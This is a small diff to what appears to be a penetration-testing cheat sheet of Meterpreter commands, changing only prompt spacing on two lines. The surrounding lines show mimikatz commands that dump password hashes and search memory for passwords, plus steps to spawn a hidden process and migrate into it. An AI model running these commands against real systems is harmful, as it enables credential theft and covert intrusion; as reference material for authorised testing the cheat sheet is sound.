@@ -55,8 +55,8 @@ meterpreter> mimikatz_command -f samdump::hashes
 meterpreter> mimikatz_command -f sekurlsa::searchPasswords
 
 #create a new x64 process from an x86 meterpreter session and migrate into the process (need matching architecture for mimikatz..etc)
-meterpreter>execute -H -c -f "C:\\WINDOWS\\Sysnative\\notepad.exe"
-meterpreter>migrate PROCESSID (shown in preavious command)
+meterpreter> execute -H -c -f "C:\\WINDOWS\\Sysnative\\notepad.exe"
+meterpreter> migrate PROCESSID (shown in preavious command)
 
 
 
